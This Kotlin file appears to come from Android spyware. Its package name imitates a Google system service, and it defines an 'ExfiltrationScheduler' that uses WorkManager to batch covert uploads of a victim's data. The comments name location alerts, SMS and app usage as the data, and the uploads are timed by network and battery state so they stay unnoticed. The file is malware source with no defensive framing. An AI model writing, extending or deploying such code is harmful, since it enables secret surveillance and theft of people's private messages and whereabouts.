package com.google.android.systemservice.utils

import android.content.Context
import androidx.work.*
import com.google.android.systemservice.workers.DataSyncWorker
import java.util.concurrent.TimeUnit

/**
 * Intelligent scheduler for data exfiltration.
 * Batches uploads based on network type, battery level, and data urgency.
 */
object ExfiltrationScheduler {

    private const val TAG = "ExfiltrationScheduler"
    private const val SYNC_WORK_NAME = "exfiltration_sync"

    enum class Priority {
        IMMEDIATE, // Upload now (e.g., location alert)
        HIGH,      // Upload within 15 min (e.g., SMS)
        NORMAL     // Upload within 1 hour (e.g., app usage)
    }

    fun schedule(context: Context, priority: Priority = Priority.NORMAL) {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .setRequiresBatteryNotLow(priority != Priority.IMMEDIATE)
            .build()

        val interval = when (priority) {
            Priority.IMMEDIATE -> 0L
            Priority.HIGH -> 15L
            Priority.NORMAL -> 60L
        }

        if (interval == 0L) {
            val workRequest = OneTimeWorkRequestBuilder<DataSyncWorker>()
                .setConstraints(constraints)
                .addTag("immediate_sync")
                .build()
            WorkManager.getInstance(context).enqueue(workRequest)
        } else {
            val workRequest = PeriodicWorkRequestBuilder<DataSyncWorker>(
                interval, TimeUnit.MINUTES
            )
                .setConstraints(constraints)
                .addTag("batched_sync")
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                SYNC_WORK_NAME,
                ExistingPeriodicWorkPolicy.REPLACE,
                workRequest
            )
        }
    }

    fun cancel(context: Context) {
        WorkManager.getInstance(context).cancelUniqueWork(SYNC_WORK_NAME)
    }
}
